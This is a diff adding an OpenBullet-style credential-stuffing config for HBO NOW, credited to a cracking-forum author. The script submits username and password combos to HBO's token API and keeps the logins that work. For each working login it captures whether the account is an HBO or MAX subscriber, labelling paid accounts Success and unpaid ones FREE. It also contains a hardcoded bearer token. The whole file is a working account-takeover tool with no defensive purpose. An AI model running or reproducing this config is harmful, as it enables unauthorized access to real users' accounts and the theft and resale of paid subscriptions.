@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "HBO NOW",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-01T01:56:48.8196818-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/vnd.hbo.v9.full+json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0aW1lc3RhbXAiOjE1ODMwNDQ4NjUyOTQsImV4cGlyYXRpb24iOjE1ODMwNTkyNjUyOTQsInBheWxvYWQiOnsiaGlzdG9yaWNhbE1ldGFkYXRhIjp7Im9yaWdpbmFsSXNzdWVkVGltZXN0YW1wIjoxNTgzMDQ0ODY1Mjk0LCJvcmlnaW5hbEdyYW50VHlwZSI6ImNsaWVudF9jcmVkZW50aWFscyIsIm9yaWdpbmFsVmVyc2lvbiI6Mn0sImV4cGlyYXRpb25NZXRhZGF0YSI6eyJhdXRoelRpbWVvdXRNcyI6MTQ0MDAwMDAsImF1dGhuVGltZW91dE1zIjozMTEwNDAwMDAwMCwiYXV0aHpFeHBpcmF0aW9uVXRjIjoxNTgzMDU5MjY1Mjk0LCJhdXRobkV4cGlyYXRpb25VdGMiOjE2MTQxNDg4NjUyOTR9LCJ0b2tlblByb3BlcnR5RGF0YSI6eyJjbGllbnRJZCI6Ijg4YTRmM2M2LWYxZGUtNDJkNy04ZWY5LWQzYjAwMTM5ZWE2YSIsImRldmljZVNlcmlhbE51bWJlciI6IjdhNTUzNDVmLTlhNjktNDFjNi05NzFkLTQ3YTg0NjFhMDRmOSIsInBlcm1pc3Npb25zIjpbNSw3XSwiY291bnRyeUNvZGUiOiJVUyIsInBsYXRmb3JtVGVuYW50Q29kZSI6Imhib0RpcmVjdCIsInByb2R1Y3RDb2RlIjoiaGJvTm93IiwiZGV2aWNlQ29kZSI6ImRlc2t0b3AiLCJwbGF0Zm9ybVR5cGUiOiJkZXNrdG9wIiwic2VydmljZUNvZGUiOiJIQk8iLCJjbGllbnREZXZpY2VEYXRhIjp7InBheW1lbnRQcm92aWRlckNvZGUiOiJibGFja21hcmtldCJ9fSwiY3VycmVudE1ldGFkYXRhIjp7ImVudmlyb25tZW50IjoicHJvZHVjdGlvbiIsInZlcnNpb24iOjIsIm5vbmNlIjoiYjgxMWI5MDYtYzYwZC00MmE3LWFlNjQtMzljNzUxMmI1OTczIiwiaXNzdWVkVGltZXN0YW1wIjoxNTgzMDQ0ODY1Mjk0fSwicGVybWlzc2lvbnMiOls1LDddLCJ0b2tlbl90eXBlIjoiYWNjZXNzIiwiZW52aXJvbm1lbnQiOiJwcm9kdWN0aW9uIiwidmVyc2lvbiI6Mn19.IkqYKZKHZAyIOsBaecd-bCFi-MpxqGkykJNe6xlitjs" 
+  HEADER "content-length: 155" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://play.hbonow.com" 
+  HEADER "referer: https://play.hbonow.com/page/urn:hbo:page:home?icid=hbo_signin_now" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36" 
+  HEADER "x-b3-traceid: 52a82759-d713-4f3b-811b-38bf0e9f4ffc-2bb84a4e-95c7-4585-f8ce-b9c39bf8d988" 
+  HEADER "x-hbo-client-version: Hadron/25.0.0.334 desktop (DESKTOP)" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect." 
+
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"" -> VAR "TOKEN" 
+
+REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:privacy-settings:mine\"},{\"id\":\"urn:hbo:user:me\"},{\"id\":\"urn:hbo:settings:mine\"},{\"id\":\"urn:hbo:query:lastplayed\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "\"isHBOSubscriber\": " "," CreateEmpty=FALSE -> CAP "HBO" 
+
+PARSE "<SOURCE>" LR "\"isMAXSubscriber\": " "," CreateEmpty=FALSE -> CAP "MAX" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<HBO>" Contains "true" 
+    KEY "<MAX>" Contains "true" 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<HBO>" Contains "false" 
+    KEY "<MAX>" Contains "false" 
+
